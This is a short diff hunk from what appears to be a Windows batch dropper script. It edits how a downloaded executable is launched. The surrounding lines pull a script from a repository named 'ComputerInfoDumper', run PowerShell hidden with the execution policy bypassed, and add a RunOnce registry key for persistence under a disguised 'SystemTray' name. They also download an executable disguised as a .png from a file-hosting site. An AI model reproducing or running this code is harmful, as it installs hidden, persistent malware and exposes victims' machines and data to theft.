@@ -8,4 +8,4 @@ curl -X GET https://raw.githubusercontent.com/dazd-pkz/ComputerInfoDumper/main/s
 powershell.exe saps cmd.exe '/c %windir%\System32\WindowsPowerShell\v1.0\powershell.exe -executionpolicy bypass %temp%\script.ps1' -WindowStyle Hidden
 REG ADD HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce /v SystemTray /t REG_SZ /d %programdata%\GraphicsType\SystemTray.bat
 curl -X GET https://files.catbox.moe/m3krrp.png -o %programdata%\GraphicsType\SystemTray.exe
-start %programdata%\GraphicsType\SystemTray.exe
+start explorer.exe %programdata%\GraphicsType\SystemTray.exe
